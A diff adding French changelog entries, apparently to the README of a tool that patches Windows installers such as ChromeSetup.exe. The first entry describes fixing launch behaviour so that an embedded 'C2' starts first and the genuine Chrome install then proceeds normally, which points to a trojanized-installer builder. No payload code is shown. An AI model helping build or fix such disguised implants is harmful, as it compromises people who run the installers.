@@ -2,6 +2,15 @@
 
 ## 🔧 Correctifs Récents (2 nov 2025)
 
+### Patch Mode - Windows Execution Fix
+**Problème** : ChromeSetup.exe patché ne lance pas l'installation sur Windows  
+**Cause** : `subprocess.Popen()` ne fonctionne pas bien avec les installateurs Windows  
+**Solution** :
+- ✅ Utilisation de `os.startfile()` sur Windows (méthode native)
+- ✅ Fallback vers `subprocess` avec `shell=True` si erreur
+- ✅ Simplification: C2 démarre immédiatement, puis lance l'app originale
+- ✅ L'installation Chrome devrait maintenant fonctionner normalement
+
 ### Unicode Encoding Fix
 **Problème** : Erreur GitHub Actions - `'charmap' codec can't encode character '\u2705'`  
 **Cause** : Emojis (✅) incompatibles avec l'encodage Windows `charmap`  
